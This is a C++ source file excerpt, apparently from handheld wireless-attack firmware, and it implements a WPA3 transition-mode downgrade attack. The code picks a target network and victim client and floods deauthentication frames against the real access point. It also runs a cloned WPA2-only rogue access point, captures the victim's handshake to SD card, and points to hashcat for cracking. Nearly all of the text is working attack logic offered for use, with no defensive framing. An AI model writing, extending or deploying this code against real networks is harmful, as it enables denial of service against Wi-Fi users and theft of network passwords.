static void w3dDrawStats(const roguehs::State& s, uint32_t deauths, uint32_t elapsedMs) {
    int y = outputY + 6 * LINE_HEIGHT;
    displayManager.fillRect(0, y - 1, SCREEN_WIDTH, 2 * LINE_HEIGHT, TFT_BLACK);

    displayManager.setCursor(6, y);
    char l1[40];
    snprintf(l1, sizeof(l1), "Prb %lu  Ath %lu  Asc %lu",
             (unsigned long)s.probes, (unsigned long)s.auths, (unsigned long)s.assocs);
    displayManager.setTextColor(TFT_WHITE); displayManager.printText(l1);
    displayManager.setTextColor(s.gotM2 ? TFT_GREEN : 0x7BEF);
    displayManager.printText(s.gotM2 ? "  M2 OK" : "  M2 --");

    displayManager.setCursor(6, y + LINE_HEIGHT);
    char l2[40];
    snprintf(l2, sizeof(l2), "deauths %lu   %lus",
             (unsigned long)deauths, (unsigned long)(elapsedMs / 1000));
    displayManager.setTextColor(0x7BEF); displayManager.printText(l2);
    displayManager.setTextColor(TFT_WHITE);
}

// ── entry ─────────────────────────────────────────────────────────────────────────

void runWpa3Down(char* args) {
    if (!wifiFunctions.isScanDone()) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("Run sw (scan) first.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }

    // Build the WPA3/TD candidate list from the last scan.
    int tdIdx[W3D_MAX_TD]; int tdCount = 0;
    int total = wifiFunctions.getNetworkCount();
    for (int i = 0; i < total && tdCount < W3D_MAX_TD; i++)
        if (wifiFunctions.getNetworkSec(i) == WSEC_TD) tdIdx[tdCount++] = i;

    // Strip leading `probe` / `auto` tokens (any order):
    //   probe = PMF recon only (no attack); auto = auto-pick the busiest client.
    bool  probeOnly = false, autoPick = false;
    char* rest = args;
    if (rest) {
        while (*rest == ' ') rest++;
        for (;;) {
            if (strncasecmp(rest, "probe", 5) == 0 && (rest[5] == ' ' || rest[5] == '\0')) {
                probeOnly = true; rest += 5; while (*rest == ' ') rest++; continue;
            }
            if (strncasecmp(rest, "auto", 4) == 0 && (rest[4] == ' ' || rest[4] == '\0')) {
                autoPick = true; rest += 4; while (*rest == ' ') rest++; continue;
            }
            break;
        }
    }

    // Optional victim MAC (`w3d [idx] <aa:bb:cc:dd:ee:ff>`) → directed deauth + PMF probe.
    uint8_t victim[6]; bool hasVictim = (rest && *rest) && w3dParseMac(rest, victim);

    // Resolve the target: explicit `w3d <index>` (any sec), else the TD picker.
    // Only treat a leading numeric token as the index — a MAC arg must not be read as one.
    int target = -1;
    if (rest && *rest) {
        const char* s = rest; while (*s == ' ') s++;
        bool tokIsMac = false;
        for (const char* t = s; *t && *t != ' '; t++) if (*t == ':') { tokIsMac = true; break; }
        if (!tokIsMac && isdigit((unsigned char)*s)) {
            int i = atoi(s);
            if (i >= 0 && i < total) target = i;
        }
    }
    if (target < 0) {
        if (tdCount == 0) {
            displayManager.clearScreen();
            displayManager.setCursor(10, outputY);
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println("No WPA3/TD APs in last scan.");
            displayManager.setTextColor(0x7BEF);
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.println("Only transition-mode is downgradeable.");
            displayManager.setTextColor(TFT_WHITE);
            displayManager.printCommandScreen();
            return;
        }
        target = w3dPickTarget(tdIdx, tdCount);
        if (target < 0) { displayManager.printCommandScreen(); return; }   // cancelled
    }

    uint8_t bssid[6]; int ch = 0; char ssid[33];
    if (!wifiFunctions.getNetworkInfo(target, bssid, &ch) ||
        !wifiFunctions.getNetworkSSID(target, ssid)) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Invalid target index.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }
    if (ssid[0] == '\0') {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("Hidden SSID — resolve it first (hiddenssid).");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }
    // ── Phase 3: auto-discover a victim client (no MAC typing) ─────────────────────
    // No explicit MAC → sniff the AP's clients and pick one (or [a]/auto = busiest).
    if (!hasVictim) {
        int r = w3dPickClient(bssid, ch, autoPick, victim);
        if (r < 0) { displayManager.printCommandScreen(); return; }   // cancelled
        if (r == 1) hasVictim = true;                                 // picked a client
        // r == 0 → operator chose broadcast (no victim)
    }

    // A PMF probe needs a target client to observe.
    if (probeOnly && !hasVictim) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("PMF probe needs a client.");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println("Pick one, or w3d probe <idx> <mac>.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }

    // ── empirical PMF probe (runs whenever we have a victim) ───────────────────────
    W3dPmf pmf = W3D_PMF_UNK;
    if (hasVictim) {
        char det[48];
        pmf = w3dRunPmfProbe(bssid, ch, victim, det, sizeof(det));
        bool go = w3dShowVerdict(ssid, pmf, det, probeOnly);
        if (probeOnly || !go) { displayManager.printCommandScreen(); return; }
    }

    // ── stand up the WPA2-only rogue AP (roguehs) on the target's channel ──────────
    if (!roguehs::begin(ssid, (uint8_t)ch)) {
        displayManager.clearScreen();
        displayManager.setCursor(10, outputY);
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Rogue AP start failed.");
        displayManager.setTextColor(TFT_WHITE);
        displayManager.printCommandScreen();
        return;
    }

    w3dDrawChrome(ssid, bssid, ch, pmf, hasVictim ? victim : nullptr);

    uint32_t t0 = millis(), lastDeauth = 0, lastDraw = 0, deauths = 0;
    uint32_t lastEng = 0, lastEngMs = 0;
    bool captured = false;
    while (true) {
        roguehs::poll();                                   // service rogue AP + sniff M2
        const roguehs::State& st = roguehs::state();

        // Pre-association-aware deauth FLOOD (~50/s): hammer the real AP so the victim
        // can't stay on / re-join it — but YIELD the air the instant a client is in the
        // auth/assoc handshake with OUR rogue, so the tight TX loop doesn't starve the
        // rogue's auth-resp/assoc-resp/M1 (resume-plan #2). Key off auths+assocs only —
        // NOT probes, which climb from any nearby scanner and would suppress deauth forever.
        // Against a PMF-required client this can't drop an established link — it only
        // disrupts its next (re)association attempt (pre-assoc frames aren't PMF-protected).
        uint32_t eng = st.auths + st.assocs;
        if (eng != lastEng) { lastEng = eng; lastEngMs = millis(); }
        bool joining = lastEngMs && (millis() - lastEngMs < 400);
        if (!joining && millis() - lastDeauth >= 20) {
            w3dDeauth(bssid);                              // broadcast
            if (hasVictim) w3dDeauthDir(bssid, victim);    // directed pair (effective when PMF off)
            deauths++; lastDeauth = millis();
        }

        if (st.gotM2) { captured = true; break; }

        if (LockScreenManager::getInstance().consumeJustUnlocked())
            w3dDrawChrome(ssid, bssid, ch, pmf, hasVictim ? victim : nullptr);
        if (!displayManager.isBlocked() && millis() - lastDraw > 250) {
            w3dDrawStats(st, deauths, millis() - t0);
            lastDraw = millis();
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
    }

    // ── teardown BEFORE any SD write (roguehs::end → idle STA, GDMA-safe) ──────────
    roguehs::end();
    const roguehs::State& snap = roguehs::state();   // captured material persists after end()

    displayManager.clearScreen();
    displayManager.setCursor(10, outputY);
    displayManager.setDefaultTextSize();
    if (captured) {
        char capName[64];
        bool saved = w3dSaveCap(ssid, snap, capName, sizeof(capName));
        char sm[18]; w3dBssidStr(snap.staMac, sm);

        displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
        displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
        displayManager.setTextColor(TFT_GREEN);  displayManager.printText("CAPTURED");
        displayManager.setTextColor(0x7BEF);     displayManager.println("]");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_GREEN);
        displayManager.println("Downgrade handshake captured!");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_WHITE);  displayManager.printText("Victim: ");
        displayManager.setTextColor(0x7BEF);     displayManager.println(sm);
        displayManager.setCursor(10, displayManager.getCursorY());
        if (saved) {
            displayManager.setTextColor(TFT_GREEN); displayManager.println("Saved:");
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.setTextColor(TFT_WHITE);
            char path[96]; snprintf(path, sizeof(path), SD_DIR_WPA3DOWN "/%s", capName);
            displayManager.println(path);
            displayManager.setCursor(10, displayManager.getCursorY());
            displayManager.setTextColor(0x7BEF);
            displayManager.println("Crack: cc (or hashcat -m 22000)");
        } else {
            displayManager.setTextColor(TFT_YELLOW);
            displayManager.println("No SD — handshake NOT saved.");
        }
    } else {
        displayManager.setTextColor(0x7BEF);     displayManager.printText("[");
        displayManager.setTextColor(TFT_CYAN);   displayManager.printText("W3D");
        displayManager.setTextColor(0x7BEF);     displayManager.printText("::");
        displayManager.setTextColor(TFT_YELLOW); displayManager.printText("STOPPED");
        displayManager.setTextColor(0x7BEF);     displayManager.println("]");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_YELLOW);
        displayManager.println("No downgrade handshake. Likely:");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(0x7BEF);
        displayManager.println(" - PMF required (deauth blocked)");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println(" - transition-disable on client");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.println(" - no WPA2 client / out of range");
        displayManager.setCursor(10, displayManager.getCursorY());
        displayManager.setTextColor(TFT_CYAN);
        displayManager.println("Try a non-PMF / older client.");
    }
    displayManager.setTextColor(TFT_WHITE);

    // wait for a keypress so the result is readable
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k) break;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) { /* result stays */ }
        delay(20);
    }
    displayManager.printCommandScreen();
}
